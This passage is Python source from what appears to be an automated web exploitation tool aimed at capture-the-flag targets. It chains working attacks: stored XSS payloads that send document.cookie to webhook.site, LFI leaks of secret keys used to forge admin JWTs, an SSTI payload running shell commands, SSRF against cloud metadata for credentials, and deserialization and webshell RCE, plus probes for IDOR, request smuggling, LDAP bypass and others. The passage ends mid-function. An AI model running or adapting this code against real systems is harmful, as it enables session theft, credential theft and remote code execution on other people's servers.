        action = step.get("action", "")
        print_info(f"  [Reasoning Plan] Step {step['step']}: {goal}")

        # Track per-chain results
        if chain:
            chain_results.setdefault(chain, [])

        success = False

        # ── XSS-to-Admin chain steps ────────────────────────────────────
        if chain == "XSS -> Admin Bot -> Flag":
            success = self._execute_xss_chain_step(step, executed)
        # ── LFI -> Secret -> Session -> Admin -> SSTI chain ─────────────
        elif chain == "LFI -> Secret Leak -> Session Forgery -> Admin -> SSTI":
            success = self._execute_lfi_chain_step(step, executed)
        # ── SQLi -> Auth Bypass -> Admin -> Flag chain ──────────────────
        elif chain == "SQLi -> Auth Bypass -> Admin -> Flag":
            success = self._execute_sqli_chain_step(step, executed)
        # ── SSRF -> Cloud Metadata -> Credentials -> Admin chain ────────
        elif chain == "SSRF -> Cloud Metadata -> Credentials -> Admin":
            success = self._execute_ssrf_chain_step(step, executed)
        # ── Deserialization -> RCE -> Flag chain ────────────────────────
        elif chain == "Deserialization -> RCE -> Flag":
            success = self._execute_deser_chain_step(step, executed)
        # ── File Upload -> Webshell -> RCE -> Flag chain ────────────────
        elif chain == "File Upload -> Webshell -> RCE -> Flag":
            success = self._execute_upload_chain_step(step, executed)
        # ── Generic hypothesis step (fallback to existing exploit) ──────
        elif hypothesis:
            success = self._execute_hypothesis_step(hypothesis, step)

        if chain:
            chain_results[chain].append(success)
        return success

    def _execute_hypothesis_step(self, hypothesis, step):
        """Fallback: route a hypothesis step to the matching exploit method."""
        exploit_map = {
            "xss_to_admin": self._exploit_xss_to_admin,
            "ssti": self._exploit_ssti,
            "lfi": self._exploit_lfi,
            "cmd_injection": self._exploit_command_injection,
            "deserialization": self._exploit_deserialization,
            "nosql": self._exploit_nosql,
            "sqli": self._exploit_sqli,
            "jwt": self._exploit_jwt,
            "php_tricks": self._exploit_php_tricks,
            "eval_injection": self._exploit_eval_injection,
            "file_upload": self._exploit_file_upload,
        }
        method = exploit_map.get(hypothesis)
        if not method:
            return False
        try:
            method()
            return True
        except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
            print_warning(f"  [Reasoning Plan] Hypothesis step '{hypothesis}' failed: {e}")
            return False

    def _execute_xss_chain_step(self, step, executed):
        """Execute a step of the XSS -> Admin Bot -> Flag chain."""
        goal = step.get("goal", "")
        if "Inject stored XSS" in goal:
            # Submit XSS payload into message/comment form
            return self._submit_stored_xss_payload()
        elif "Trigger admin bot" in goal:
            # Submit report URL to admin bot endpoint
            return self._trigger_admin_bot()
        elif "Steal admin session" in goal or "execute admin action" in goal:
            # Check if admin bot visited and we captured a session/flag
            return self._check_admin_bot_result()
        elif "Capture flag from admin" in goal:
            # Try to read flag from admin-only page
            return self._read_admin_flag()
        return False

    def _submit_stored_xss_payload(self):
        """Submit a stored XSS payload into a message/comment form."""
        from modules.cheatsheet import XSS_EVASION
        # XSS_EVASION entries use "Payload/Tip" key (not "payload")
        payloads = []
        for p in XSS_EVASION[:5]:
            if isinstance(p, dict):
                payloads.append(p.get("Payload/Tip") or p.get("payload") or "")
        payloads = [p for p in payloads if p]
        payloads += [
            '<script>fetch("https://webhook.site/"+document.cookie)</script>',
            '<img src=x onerror="fetch(\'https://webhook.site/\'+document.cookie)">',
            '<svg onload="fetch(\'https://webhook.site/\'+document.cookie)">',
        ]
        for form in self.state.get("forms", []):
            inputs = form.get("inputs", [])
            msg_field = next((i.get("name") for i in inputs
                              if any(k in i.get("name", "").lower() for k in ["message", "comment", "post", "content", "text", "msg"])), None)
            if not msg_field:
                continue
            action = form.get("action", self.target_url)
            method = form.get("method", "POST")
            for payload in payloads:
                data = {msg_field: payload}
                for i in inputs:
                    n = i.get("name")
                    if n and n != msg_field and i.get("type") not in ["submit", "button"]:
                        data.setdefault(n, "")
                try:
                    if method.upper() == "POST":
                        r = self.session.post(action, data=data, timeout=15)
                    else:
                        r = self.session.get(action, params=data, timeout=15)
                    # Check if payload reflected/stored
                    if payload.split(">")[0] in r.text or "success" in r.text.lower():
                        print_success(f"  [XSS Chain] Stored XSS payload submitted: {payload[:60]}")
                        self.state["xss_payload_submitted"] = payload
                        self._log_step("Phase 4: XSS Chain", "Stored XSS payload submitted", details=payload[:80])
                        return True
                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                    pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                    pass
        return False

    def _trigger_admin_bot(self):
        """Submit the stored XSS URL to the admin bot / report endpoint."""
        payload = self.state.get("xss_payload_submitted")
        if not payload:
            return False
        # Find report endpoint
        for ep in self.state.get("endpoints", []):
            if any(k in ep.lower() for k in ["report", "contact", "bot", "visit"]):
                report_url = urljoin(self.target_url, ep)
                try:
                    # Try common report params
                    for param in ["url", "link", "target", "site", "page"]:
                        r = self.session.post(report_url, data={param: self.target_url}, timeout=15)
                        if r.status_code in [200, 302]:
                            print_success(f"  [XSS Chain] Admin bot triggered via {report_url}")
                            self.state["admin_bot_triggered"] = True
                            self._log_step("Phase 4: XSS Chain", "Admin bot triggered", details=report_url)
                            return True
                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                    pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                    pass
        return False

    def _check_admin_bot_result(self):
        """Check if the admin bot visit produced a flag or session leak."""
        # Re-request admin pages in case the bot's action revealed a flag
        for path in ["/admin", "/flag", "/admin/flag", "/dashboard"]:
            try:
                r = self.session.get(urljoin(self.target_url, path), timeout=15)
                if self._check_and_store_flags(r.text, f"Admin bot result ({path})"):
                    return True
            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                pass
        return False

    def _read_admin_flag(self):
        """Try to read the flag from admin-only pages."""
        for path in ["/admin", "/admin/flag", "/flag", "/admin/dashboard", "/panel"]:
            try:
                r = self.session.get(urljoin(self.target_url, path), timeout=15)
                if self._check_and_store_flags(r.text, f"Admin flag ({path})"):
                    return True
            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                pass
        return False

    def _execute_lfi_chain_step(self, step, executed):
        """Execute a step of the LFI -> Secret -> Session -> Admin -> SSTI chain."""
        goal = step.get("goal", "")
        if "Leak source via LFI" in goal:
            return self._exploit_lfi() or bool(self.state.get("leaked_source_files"))
        elif "Extract SECRET_KEY" in goal:
            for fname, content in self.state.get("leaked_source_files", {}).items():
                m = re.search(r"(?:SECRET_KEY|JWT_SECRET|APP_SECRET)\s*=\s*['\"]([^'\"]+)['\"]", content, re.IGNORECASE)
                if m:
                    self.state["leaked_secrets"]["secret_key"] = m.group(1)
                    print_success(f"  [LFI Chain] Extracted SECRET_KEY: {m.group(1)}")
                    return True
            return False
        elif "Forge admin session" in goal:
            secret = self.state.get("leaked_secrets", {}).get("secret_key")
            if not secret:
                return False
            try:
                forged = sign_jwt_hs256({}, {"user": "admin", "role": "admin", "isAdmin": True}, secret)
                self.state["forged_admin_token"] = forged
                print_success("  [LFI Chain] Forged admin session token")
                return True
            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                return False
        elif "Access admin panel" in goal:
            forged = self.state.get("forged_admin_token")
            if not forged:
                return False
            for path in ["/admin", "/admin/dashboard", "/dashboard", "/panel"]:
                try:
                    r = self.session.get(urljoin(self.target_url, path),
                                         cookies={"session": forged, "jwt": forged, "token": forged}, timeout=15)
                    if r.status_code == 200:
                        print_success(f"  [LFI Chain] Admin access granted via forged token: {path}")
                        self.state["admin_accessible"] = True
                        return True
                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                    pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                    pass
            return False
        elif "SSTI in admin template" in goal:
            if not self.state.get("admin_accessible"):
                return False
            forged = self.state.get("forged_admin_token")
            for path in ["/admin", "/admin/dashboard", "/panel"]:
                try:
                    r = self.session.get(urljoin(self.target_url, path),
                                         cookies={"session": forged}, timeout=15)
                    params = extract_forms_and_links(r.text, urljoin(self.target_url, path))["parameters"]
                    for p in params:
                        ssti_resp = self.session.get(
                            urljoin(self.target_url, path),
                            params={p: "{{ lipsum.__globals__['os'].popen('cat /flag* || cat /root/*flag*').read() }}"},
                            cookies={"session": forged}, timeout=15)
                        if self._check_and_store_flags(ssti_resp.text, f"Admin SSTI ({p})"):
                            return True
                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                    pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                    pass
            return False
        return False

    def _execute_sqli_chain_step(self, step, executed):
        """Execute a step of the SQLi -> Auth Bypass -> Admin -> Flag chain."""
        goal = step.get("goal", "")
        if "Bypass login via SQLi" in goal:
            return self._exploit_sqli()
        elif "Access admin session" in goal:
            return self._check_admin_flag_pages()
        elif "Capture flag from admin" in goal:
            return self._read_admin_flag()
        return False

    def _execute_ssrf_chain_step(self, step, executed):
        """Execute a step of the SSRF -> Cloud Metadata -> Credentials -> Admin chain."""
        goal = step.get("goal", "")
        if "Trigger SSRF" in goal:
            return self._exploit_ssrf()
        elif "Extract cloud credentials" in goal:
            return self._check_ssrf_credentials()
        elif "Use credentials for admin" in goal:
            return self._check_admin_flag_pages()
        return False

    def _execute_deser_chain_step(self, step, executed):
        """Execute a step of the Deserialization -> RCE -> Flag chain."""
        goal = step.get("goal", "")
        if "Inject deserialization" in goal:
            return self._exploit_deserialization()
        elif "Achieve RCE" in goal:
            return bool(self.state.get("active_rce_method"))
        elif "Capture flag via RCE" in goal:
            if self.state.get("active_rce_method"):
                try:
                    out = self.state["active_rce_method"]("cat /flag* || cat /flag.txt || find / -name '*flag*' 2>/dev/null")
                    return self._check_and_store_flags(out, "Deserialization RCE flag")
                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                    pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                    pass
            return False
        return False

    def _execute_upload_chain_step(self, step, executed):
        """Execute a step of the File Upload -> Webshell -> RCE -> Flag chain."""
        goal = step.get("goal", "")
        if "Upload malicious file" in goal:
            return self._exploit_file_upload()
        elif "Access uploaded file" in goal:
            return bool(self.state.get("active_rce_method"))
        elif "Execute commands via webshell" in goal:
            return bool(self.state.get("active_rce_method"))
        elif "Capture flag" in goal:
            if self.state.get("active_rce_method"):
                try:
                    out = self.state["active_rce_method"]("cat /flag* || cat /flag.txt || find / -name '*flag*' 2>/dev/null")
                    return self._check_and_store_flags(out, "Webshell RCE flag")
                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                    pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                    pass
            return False
        return False

    def _exploit_ssrf(self):
        """Probe for SSRF via URL-fetching parameters (cloud metadata + internal)."""
        from modules.ssrf import CLOUD_METADATA_ENDPOINTS, obfuscate_ip
        params = list(self.state.get("parameters", []))
        ssrf_params = [p for p in params if any(k in p.lower() for k in ["url", "link", "redirect", "src", "fetch", "media_uri", "host", "ip"])]
        if not ssrf_params:
            return False
        success = False
        for p in ssrf_params:
            for meta in CLOUD_METADATA_ENDPOINTS[:3]:
                try:
                    r = self.session.get(self.target_url, params={p: meta["url"]}, timeout=15)
                    if r.status_code == 200 and any(k in r.text.lower() for k in ["accesskey", "secret", "token", "client_id", "account", "role"]):
                        print_success(f"  [SSRF Chain] Cloud metadata leaked via '{p}': {meta['provider']}")
                        self._log_step("Phase 4: SSRF Chain", f"SSRF leaked {meta['provider']} metadata", details=meta["url"])
                        self._check_and_store_flags(r.text, f"SSRF metadata ({meta['provider']})")
                        success = True
                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                    pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                    pass
        return success

    def _check_ssrf_credentials(self):
        """Check if SSRF leaked cloud credentials (IMDS/metadata)."""
        for path in ["/admin", "/flag", "/dashboard"]:
            try:
                r = self.session.get(urljoin(self.target_url, path), timeout=15)
                if self._check_and_store_flags(r.text, f"SSRF credential use ({path})"):
                    return True
            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                pass
        return False

    def _check_admin_flag_pages(self):
        """Check admin/flag pages for captured flags."""
        for path in ["/admin", "/flag", "/admin/flag", "/dashboard", "/panel"]:
            try:
                r = self.session.get(urljoin(self.target_url, path), timeout=15)
                if self._check_and_store_flags(r.text, f"Admin page ({path})"):
                    return True
            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                pass
        return False

    # =========================================================================
    # NEW EXPLOIT ENGINES: CORS / Open Redirect / HPP / CRLF / CSRF / GraphQL / LDAP / IDOR
    # =========================================================================

    def _exploit_cors(self):
        """Probe for CORS misconfiguration by sending crafted Origin headers."""
        from modules.cors import get_cors_test_origins
        print_info("Testing CORS Misconfiguration Vectors...")
        success = False
        # Test on API endpoints and the base URL
        targets = [self.target_url]
        for ep in self.state.get("endpoints", []):
            if any(k in ep.lower() for k in ["api", "user", "account", "profile", "data"]):
                targets.append(urljoin(self.target_url, ep))

        # Derive the target's own origin for trusted-origin tests
        from urllib.parse import urlparse
        parsed = urlparse(self.target_url)
        target_origin = f"{parsed.scheme}://{parsed.netloc}"

        for target in targets:
            for origin_test in get_cors_test_origins():
                origin = origin_test["origin"]
                # Dynamically adapt the origin to the target's domain for trusted-subdomain tests
                if "trusted.com" in origin and parsed.netloc:
                    origin = origin.replace("trusted.com", parsed.netloc)
                try:
                    r = self.session.get(target, headers={"Origin": origin}, timeout=10)
                    acao = r.headers.get("Access-Control-Allow-Origin", "")
                    acac = r.headers.get("Access-Control-Allow-Credentials", "")
                    if acao and (acao == origin or acao == "*"):
                        # Vulnerable: reflects origin or allows all
                        if acac.lower() == "true" or acao == origin:
                            print_success(f"  [CORS] Misconfiguration on {target}: ACAO='{acao}' ACAC='{acac}' (Origin: {origin})")
                            self._log_step("Phase 4: CORS", f"CORS misconfig on {target}", details=f"Origin={origin} -> ACAO={acao}")
                            self._check_and_store_flags(r.text, f"CORS ({origin})")
                            success = True
                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                    pass
        return success

    def _exploit_open_redirect(self):
        """Probe for open redirect via redirect parameters."""
        from modules.open_redirect import get_redirect_parameters, get_open_redirect_payloads
        print_info("Testing Open Redirect Vectors...")
        success = False
        params = list(self.state.get("parameters", []))
        redirect_params = [p for p in params if any(k in p.lower() for k in get_redirect_parameters())]
        if not redirect_params:
            redirect_params = ["url", "redirect", "next", "return", "goto", "dest", "continue"]

        # Build candidate URLs: base URL + redirect-like endpoints
        candidate_urls = [self.target_url]
        for ep in self.state.get("endpoints", []):
            if any(k in ep.lower() for k in ["redirect", "logout", "login", "return", "next", "go", "out"]):
                candidate_urls.append(urljoin(self.target_url, ep))

        # Use a benign external target to detect redirects (avoid false positives)
        probe_target = "https://example.com"
        for base in candidate_urls:
            for p in redirect_params:
                for payload in get_open_redirect_payloads(probe_target):
                    try:
                        r = self.session.get(base, params={p: payload["payload"]}, timeout=10, allow_redirects=False)
                        loc = r.headers.get("Location", "")
                        if loc and ("example.com" in loc or "//" in loc and "target" not in loc):
                            print_success(f"  [Open Redirect] '{p}' on {base} redirects to: {loc}")
                            self._log_step("Phase 4: Open Redirect", f"Redirect via '{p}' on {base}", details=loc)
                            success = True
                            break
                    except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                        pass
        return success

    def _exploit_hpp(self):
        """Probe for HTTP Parameter Pollution by sending duplicate parameters."""
        from modules.hpp import get_hpp_payloads
        print_info("Testing HTTP Parameter Pollution Vectors...")
        success = False
        params = list(self.state.get("parameters", []))
        if not params:
            params = ["role", "user", "id", "admin", "isAdmin"]

        for p in params:
            for payload in get_hpp_payloads(p, "admin"):
                try:
                    # Parse the HPP payload into duplicate params
                    pairs = payload["payload"].split("&")
                    query = {}
                    for pair in pairs:
                        if "=" in pair:
                            k, v = pair.split("=", 1)
                            query.setdefault(k, []).append(v)
                    # Send as duplicate params
                    r = self.session.get(self.target_url, params=query, timeout=10)
                    # Check for auth/role indicators in response
                    if any(k in r.text.lower() for k in ["admin", "welcome", "dashboard", "flag", "success"]):
                        print_success(f"  [HPP] Potential bypass via '{payload['name']}' on param '{p}'")
                        self._log_step("Phase 4: HPP", f"HPP bypass via {payload['name']}", details=payload["payload"])
                        self._check_and_store_flags(r.text, f"HPP ({p})")
                        success = True
                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                    pass
        return success

    def _exploit_crlf(self):
        """Probe for CRLF injection by injecting headers via URL-encoded CRLF."""
        from modules.crlf import get_crlf_payloads
        print_info("Testing CRLF Injection Vectors...")
        success = False
        params = list(self.state.get("parameters", []))
        if not params:
            params = ["url", "redirect", "next", "page", "file", "path"]

        for p in params:
            for payload in get_crlf_payloads():
                try:
                    # Inject CRLF payload into parameter value
                    r = self.session.get(self.target_url, params={p: payload["payload"]}, timeout=10)
                    # Check if injected header appears in response headers
                    if "X-Injected" in r.headers or "Set-Cookie" in r.headers and "session=admin" in str(r.headers.get("Set-Cookie", "")):
                        print_success(f"  [CRLF] Header injection via '{p}': {payload['name']}")
                        self._log_step("Phase 4: CRLF", f"CRLF injection via {payload['name']}", details=payload["payload"])
                        success = True
                        break
                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                    pass
        return success

    def _exploit_csrf(self):
        """Probe for CSRF by checking if state-changing requests lack CSRF tokens."""
        print_info("Testing CSRF Protection Vectors...")
        success = False
        # Check forms for CSRF token presence
        for form in self.state.get("forms", []):
            action = form.get("action", "")
            inputs = form.get("inputs", [])
            input_names = [i.get("name", "").lower() for i in inputs]
            has_csrf = any("csrf" in n or "token" in n or "_token" in n for n in input_names)
            if not has_csrf and any("pass" in n or "email" in n or "user" in n for n in input_names):
                # State-changing form without CSRF token
                print_warning(f"  [CSRF] Form at {action} lacks CSRF token - potentially vulnerable")
                self._log_step("Phase 4: CSRF", f"Form without CSRF token: {action}", details="No csrf/token field found")
                success = True
        return success

    def _exploit_graphql(self):
        """Probe for GraphQL introspection and schema exposure."""
        from modules.graphql import get_graphql_introspection_queries
        print_info("Testing GraphQL Introspection Vectors...")
        success = False
        # Find GraphQL endpoints
        gql_endpoints = [ep for ep in self.state.get("endpoints", []) if any(k in ep.lower() for k in ["graphql", "gql", "query"])]
        if not gql_endpoints:
            gql_endpoints = ["/graphql", "/graphiql", "/api/graphql", "/query"]

        for ep in gql_endpoints:
            gql_url = urljoin(self.target_url, ep)
            for query in get_graphql_introspection_queries():
                try:
                    # Try POST with JSON body first, then GET with query param
                    r = self.session.post(gql_url, json={"query": query["payload"]}, timeout=10)
                    if r.status_code == 404:
                        r = self.session.get(gql_url, params={"query": query["payload"]}, timeout=10)
                    if r.status_code == 200 and ("__schema" in r.text or "__type" in r.text or "types" in r.text):
                        print_success(f"  [GraphQL] Introspection enabled on {gql_url}")
                        self._log_step("Phase 4: GraphQL", f"Introspection on {gql_url}", details=query["name"])
                        self._check_and_store_flags(r.text, f"GraphQL introspection ({gql_url})")
                        success = True
                        break
                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                    pass
        return success

    def _exploit_ldap(self):
        """Probe for LDAP injection via auth forms."""
        from modules.ldap import get_ldap_auth_bypass_payloads
        print_info("Testing LDAP Injection Vectors...")
        success = False
        for form in self.state.get("forms", []):
            action = form.get("action", "")
            inputs = form.get("inputs", [])
            input_names = [i.get("name", "") for i in inputs]
            user_field = next((n for n in input_names if any(k in n.lower() for k in ["user", "login", "uid", "name"])), None)
            pass_field = next((n for n in input_names if any(k in n.lower() for k in ["pass", "pwd"])), None)
            if not user_field:
                continue

            for payload in get_ldap_auth_bypass_payloads():
                try:
                    data = {user_field: payload["payload"]}
                    if pass_field:
                        data[pass_field] = "anything"
                    r = self.session.post(action, data=data, timeout=10, allow_redirects=True)
                    # Check for auth bypass indicators
                    if any(k in r.text.lower() for k in ["welcome", "dashboard", "logged in", "flag", "admin", "success"]):
                        print_success(f"  [LDAP] Auth bypass via '{payload['name']}' on {action}")
                        self._log_step("Phase 4: LDAP", f"LDAP bypass via {payload['name']}", details=payload["payload"])
                        self._check_and_store_flags(r.text, f"LDAP ({action})")
                        success = True
                        break
                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                    pass
        return success

    def _exploit_idor(self):
        """Probe for IDOR by enumerating object references."""
        from modules.idor import get_idor_numeric_payloads, get_idor_parameters
        print_info("Testing IDOR Vectors...")
        success = False
        params = list(self.state.get("parameters", []))
        idor_params = [p for p in params if any(k in p.lower() for k in get_idor_parameters())]
        if not idor_params:
            idor_params = ["id", "user_id", "uid", "account", "profile"]

        # Build candidate URLs: base URL + object-reference-like endpoints
        candidate_urls = [self.target_url]
        for ep in self.state.get("endpoints", []):
            if any(k in ep.lower() for k in ["user", "account", "profile", "order", "file", "doc", "item", "product"]):
                candidate_urls.append(urljoin(self.target_url, ep))

        for base in candidate_urls:
            for p in idor_params:
                for payload in get_idor_numeric_payloads():
                    try:
                        r = self.session.get(base, params={p: payload["payload"]}, timeout=10)
                        # Check for data leakage / different content
                        if r.status_code == 200 and any(k in r.text.lower() for k in ["flag", "secret", "admin", "password", "email", "private", "username"]):
                            print_success(f"  [IDOR] Potential data leak via '{p}' = {payload['payload']} on {base}")
                            self._log_step("Phase 4: IDOR", f"IDOR via {payload['name']}", details=f"{p}={payload['payload']} on {base}")
                            self._check_and_store_flags(r.text, f"IDOR ({p}={payload['payload']})")
                            success = True
                            break
                    except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                        pass
        return success

    # =========================================================================
    # NEW EXPLOIT ENGINES: Race Condition / Web Cache / Smuggling / DOM / Mass Assignment / OAuth
    # =========================================================================

    def _exploit_race_condition(self):
        """Probe for race condition by sending parallel requests to state-changing endpoints."""
        from modules.race_condition import get_race_condition_vectors
        print_info("Testing Race Condition Vectors...")
        success = False
        # Identify state-changing endpoints (POST forms, API endpoints)
        targets = []
        for form in self.state.get("forms", []):
            action = form.get("action", "")
            if action and any(k in action.lower() for k in ["transfer", "redeem", "coupon", "balance", "register", "reset", "verify", "upload"]):
                targets.append(action)
        for ep in self.state.get("endpoints", []):
            if any(k in ep.lower() for k in ["transfer", "redeem", "coupon", "balance", "register", "reset", "verify", "upload", "api"]):
                targets.append(urljoin(self.target_url, ep))

        if not targets:
            return False

        # Send 5 parallel requests to each target and check for multiple successes
        import threading
        for target in targets[:3]:
            results = []
            def attack():
                try:
                    r = self.session.post(target, data={"amount": "1"}, timeout=5)
                    results.append(r.status_code)
                except Exception:
                    pass
            threads = [threading.Thread(target=attack) for _ in range(5)]
            for t in threads:
                t.start()
            for t in threads:
                t.join()
            # If multiple requests succeeded, race condition may be present
            if len(results) > 1 and all(s == 200 for s in results):
                print_success(f"  [Race Condition] Multiple successes on {target}: {len(results)}/5 requests returned 200")
                self._log_step("Phase 4: Race Condition", f"Potential race on {target}", details=f"{len(results)} parallel successes")
                success = True
        return success

    def _exploit_web_cache(self):
        """Probe for web cache deception by appending static extensions to dynamic paths."""
        from modules.web_cache import get_web_cache_deception_payloads
        print_info("Testing Web Cache Deception Vectors...")
        success = False
        # Identify dynamic endpoints (account, profile, user, etc.)
        dynamic_paths = []
        for ep in self.state.get("endpoints", []):
            if any(k in ep.lower() for k in ["account", "profile", "user", "dashboard", "settings", "admin"]):
                dynamic_paths.append(ep)
        if not dynamic_paths:
            dynamic_paths = ["/account", "/profile", "/user"]

        for path in dynamic_paths:
            for payload in get_web_cache_deception_payloads(path):
                try:
                    r = self.session.get(urljoin(self.target_url, payload["payload"]), timeout=10)
                    # If the dynamic content is served with a static extension, cache deception is possible
                    if r.status_code == 200 and any(k in r.text.lower() for k in ["account", "profile", "user", "email", "username", "flag"]):
                        print_success(f"  [Web Cache] Dynamic content served at {payload['payload']}")
                        self._log_step("Phase 4: Web Cache", f"Cache deception via {payload['name']}", details=payload["payload"])
                        self._check_and_store_flags(r.text, f"Web Cache ({payload['name']})")
                        success = True
                        break
                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                    pass
        return success

    def _exploit_smuggling(self):
        """Probe for request smuggling by sending CL.TE / TE.CL detection payloads."""
        from modules.smuggling import get_smuggling_detection_payloads
        print_info("Testing Request Smuggling Vectors...")
        success = False
        # Send detection payloads to the base URL
        for payload in get_smuggling_detection_payloads():
            try:
                # Send raw HTTP request via socket to test smuggling
                import socket
                host = urlparse(self.target_url).hostname or "127.0.0.1"
                port = urlparse(self.target_url).port or 80
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((host, port))
                s.sendall(payload["payload"].encode())
                response = s.recv(4096).decode(errors="ignore")
                s.close()
                # If response is delayed or contains unexpected content, smuggling may be present
                if "HTTP/1.1 200" in response and len(response) > 100:
                    print_success(f"  [Smuggling] Potential request smuggling via {payload['name']}")
                    self._log_step("Phase 4: Smuggling", f"Smuggling via {payload['name']}", details=payload["payload"][:100])
                    success = True
                    break
            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError, OSError) as e:
                pass
        return success

    def _exploit_dom_clobbering(self):
        """Probe for DOM clobbering by analyzing client-side JS for vulnerable patterns."""
        from modules.dom_clobbering import get_dom_clobbering_indicators
        print_info("Testing DOM Clobbering Vectors...")
        success = False
        # Analyze inline scripts and external JS for vulnerable patterns
        all_js = " ".join(self.state.get("inline_scripts", []))
        for script in self.state.get("scripts", []):
            try:
                r = self.session.get(urljoin(self.target_url, script), timeout=10)
                all_js += " " + r.text
            except Exception:
                pass

        # Check for vulnerable patterns
        import re
        vulnerable_patterns = [
            r"window\.(\w+)", r"document\.getElementById\(['\"]([^'\"]+)['\"]\)",
            r"config\.(\w+)", r"\.innerHTML\s*=", r"document\.write\("
        ]
        for pat in vulnerable_patterns:
            matches = re.findall(pat, all_js)
            if matches:
                print_success(f"  [DOM Clobbering] Vulnerable pattern '{pat}' found: {matches[:3]}")
                self._log_step("Phase 4: DOM Clobbering", f"Vulnerable JS pattern: {pat}", details=", ".join(matches[:3]))
                success = True
        return success

    def _exploit_mass_assignment(self):
        """Probe for mass assignment by injecting protected fields into API requests."""
        from modules.mass_assignment import get_mass_assignment_payloads
        print_info("Testing Mass Assignment Vectors...")
        success = False
        # Identify API endpoints
        api_endpoints = [ep for ep in self.state.get("endpoints", []) if any(k in ep.lower() for k in ["api", "user", "account", "profile", "update"])]
        if not api_endpoints:
            api_endpoints = ["/api/user", "/api/account", "/api/profile"]

        for ep in api_endpoints:
            api_url = urljoin(self.target_url, ep)
            for payload in get_mass_assignment_payloads():
                try:
                    import json as _json
                    data = _json.loads(payload["payload"])
                    r = self.session.post(api_url, json=data, timeout=10)
                    # Check for privilege escalation indicators
                    if r.status_code == 200 and any(k in r.text.lower() for k in ["admin", "role", "success", "updated", "flag"]):
                        print_success(f"  [Mass Assignment] Potential escalation via '{payload['name']}' on {api_url}")
                        self._log_step("Phase 4: Mass Assignment", f"Mass assignment via {payload['name']}", details=payload["payload"])
                        self._check_and_store_flags(r.text, f"Mass Assignment ({payload['name']})")
                        success = True
                        break
                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                    pass
        return success

    def _exploit_oauth(self):
        """Probe for OAuth misconfiguration by testing redirect_uri bypasses."""
        from modules.oauth import get_oauth_redirect_uri_bypasses
        print_info("Testing OAuth Misconfiguration Vectors...")
        success = False
        # Identify OAuth endpoints
        oauth_endpoints = [ep for ep in self.state.get("endpoints", []) if any(k in ep.lower() for k in ["oauth", "authorize", "callback", "login"])]
        if not oauth_endpoints:
            oauth_endpoints = ["/oauth/authorize", "/oauth/callback", "/login"]

        for ep in oauth_endpoints:
            oauth_url = urljoin(self.target_url, ep)
            for payload in get_oauth_redirect_uri_bypasses():
                try:
                    # Test redirect_uri bypass
                    r = self.session.get(oauth_url, params={"redirect_uri": payload["payload"]}, timeout=10, allow_redirects=False)
                    loc = r.headers.get("Location", "")
                    if loc and "evil.com" in loc:
                        print_success(f"  [OAuth] redirect_uri bypass on {oauth_url}: {payload['name']}")
                        self._log_step("Phase 4: OAuth", f"OAuth redirect_uri bypass via {payload['name']}", details=payload["payload"])
                        success = True
                        break
                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                    pass
        return success

    # =========================================================================
    # NEW EXPLOIT ENGINES: CSV / Clickjacking / DNS Rebinding / Zip Slip / Tabnabbing / CSS / SSI / XSLT / XS-Leak / LaTeX
    # =========================================================================

    def _exploit_csv_injection(self):
        """Probe for CSV injection by checking if user input is exported to CSV."""
        print_info("Testing CSV Injection Vectors...")
        success = False
        # Check for CSV export endpoints
        csv_endpoints = [ep for ep in self.state.get("endpoints", []) if any(k in ep.lower() for k in ["csv", "export", "download", "report"])]
        if not csv_endpoints:
            return False
        for ep in csv_endpoints:
            csv_url = urljoin(self.target_url, ep)
            try:
                r = self.session.get(csv_url, timeout=10)
                if r.status_code == 200 and any(k in r.text for k in [",", ";", "\t"]):
                    print_success(f"  [CSV Injection] CSV export endpoint found: {csv_url}")
                    self._log_step("Phase 4: CSV Injection", f"CSV export at {csv_url}", details="CSV content detected")
                    self._check_and_store_flags(r.text, f"CSV Injection ({csv_url})")
                    success = True
            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                pass
        return success

    def _exploit_clickjacking(self):
        """Probe for clickjacking by checking for missing X-Frame-Options / CSP frame-ancestors."""
        print_info("Testing Clickjacking Vectors...")
        success = False
        targets = [self.target_url]
        for ep in self.state.get("endpoints", []):
            if any(k in ep.lower() for k in ["action", "submit", "delete", "transfer", "settings", "admin"]):
                targets.append(urljoin(self.target_url, ep))
        for target in targets:
            try:
